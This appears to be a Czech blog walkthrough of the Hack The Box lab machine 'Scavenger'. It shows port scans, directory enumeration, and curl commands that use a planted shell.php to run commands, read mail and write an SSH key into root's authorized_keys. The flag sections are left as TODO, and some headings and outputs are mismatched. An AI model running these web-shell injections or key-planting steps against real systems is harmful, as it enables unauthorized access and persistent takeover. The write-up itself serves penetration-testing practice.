---
layout: post
author: Tomáš Matějíček
title: "Scavenger"
date: 2021-01-09
tags: linux rce ssh php exploit enumeration
---
[Scavenger](https://www.hackthebox.eu/home/machines/profile/202) je stroj z Hack The Box. Klíčová část útoku je webová enumerace a praktické zneužití nalezené slabiny.

### Vyhledání otevřených portů
Nejdřív mapuji služby, které jsou dostupné zvenku.
`ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP`
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey:
|   2048 df:94:47:03:09:ed:8c:f7:b6:91:c5:08:b5:20:e5:bc (RSA)
|   256 e3:05:c1:c5:d1:9c:3f:91:0f:c0:35:4b:44:7f:21:9e (ECDSA)
|_  256 45:92:c0:a1:d9:5d:20:d6:eb:49:db:12:a5:70:b7:31 (ED25519)
25/tcp open  smtp    Exim smtpd 4.89
| smtp-commands: ib01.supersechosting.htb Hello ib01.supersechosting.htb [10.10.14.9], SIZE 52428800, 8BITMIME, PIPELINING, PRDR, HELP,
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
43/tcp open  whois?
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest:
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|     This query returned 0 object
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     % SUPERSECHOSTING WHOIS server v0.6beta@MariaDB10.1.37
|     more information on SUPERSECHOSTING, visit http://www.supersechosting.htb
|_    1267 (HY000): Illegal mix of collations (utf8mb4_general_ci,IMPLICIT) and (utf8_general_ci,COERCIBLE) for operation 'like'
53/tcp open  domain  ISC BIND 9.10.3-P4 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.10.3-P4-Debian
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-methods:
[... výstup zkrácen ...]
SF:\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x20http://ww
SF:w\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mix\x20of\x
SF:20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(utf8_genera
SF:l_ci,COERCIBLE\)\x20for\x20operation\x20'like'")%r(TLSSessionReq,103,"%
SF:\x20SUPERSECHOSTING\x20WHOIS\x20server\x20v0\.6beta@MariaDB10\.1\.37\r\
SF:n%\x20for\x20more\x20information\x20on\x20SUPERSECHOSTING,\x20visit\x20
SF:http://www\.supersechosting\.htb\r\n1267\x20\(HY000\):\x20Illegal\x20mi
SF:x\x20of\x20collations\x20\(utf8mb4_general_ci,IMPLICIT\)\x20and\x20\(ut
SF:f8_general_ci,COERCIBLE\)\x20for\x20operation\x20'like'");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Vyhledání otevřených portů (2)
Nejdřív mapuji služby, které jsou dostupné zvenku.
`nmap -sU -T4 -v $IP`
```
=> http://www.supersechosting.htb/
```

### Enumerace webu
Procházím web a hledám skryté cesty, které nejsou dostupné z hlavní stránky.
`./dirsearch.py -u http://sec03.rentahacker.htb/ -e php`
```
=> sec03.rentahacker.htb/shell.php
```

### Spuštění exploitu
Zde dochází k praktickému zneužití zranitelnosti.
`view-source:http://sec03.rentahacker.htb/shell.php?hidden=cat%20/var/mail/*`

### Přihlášení na cíl
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`curl "http://sec03.rentahacker.htb/shell.php?hidden=echo+\"g3tPr1v\"+>+/dev/ttyR0;ls+-alh+/root/.ssh/"`

### Přihlášení na cíl (2)
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`curl "http://sec03.rentahacker.htb/shell.php?hidden=echo+\"g3tPr1v\"+>+/dev/ttyR0;echo+\"ssh-rsa+AAAAB3NzaC1yc2EAAAADAQABAAACAQDBpuZ8%2BQR3hnONfIO2Y%2FvhoVRgVDpeOUrpxa%2BEOnRNhAV9%2FdYNoi%__CENSORED__%2BzcpGO0MLPiuEl78INxwii7y94CAn1gl%__CENSORED__%2FptFIFGVukajnihbK%2Fb3uWCDtaJcgaSILoSomouxjfXqmAwj%2FTaM0qHsT7K9NZsPfOB5ZAXa2spPR%2BAGsJUYviAkFDPvgSeRrf2g9QW37pYw0Vjl%__CENSORED__%2FtFVKaW0D5acreO4JBU9cl6MCwWONLkV5GTLHNAEzIsSAk4NJw%2BppfkBwBIs1Q%3D%3D+hack@t\"+>+/root/.ssh/authorized_keys"`

### Získání user flagu
`TODO`

### Získání root flagu
`TODO`
